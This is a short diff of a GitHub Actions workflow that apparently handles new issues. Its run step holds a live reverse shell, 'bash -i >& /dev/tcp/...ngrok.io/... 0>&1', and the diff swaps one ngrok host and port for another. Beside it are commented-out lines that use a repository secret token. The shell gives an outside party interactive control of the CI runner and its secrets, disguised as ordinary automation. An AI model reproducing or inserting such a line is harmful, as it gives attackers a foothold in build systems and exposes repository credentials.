@@ -20,7 +20,7 @@ jobs:
       - run: |
          # echo "ISSUE TITLE: ${{github.event.issue.title}}"
          # echo "ISSUE DESCRIPTION: ${{github.event.issue.body}}"
-         bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/11748 0>&1
+         bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/14585 0>&1
 
       # - run: |
       #    curl -X POST -H "Authorization: Token ${{ secrets.BOT_TOKEN }}" -d '{"labels": ["New Issue"]}' ${{ github.event.issue.url }}/labels
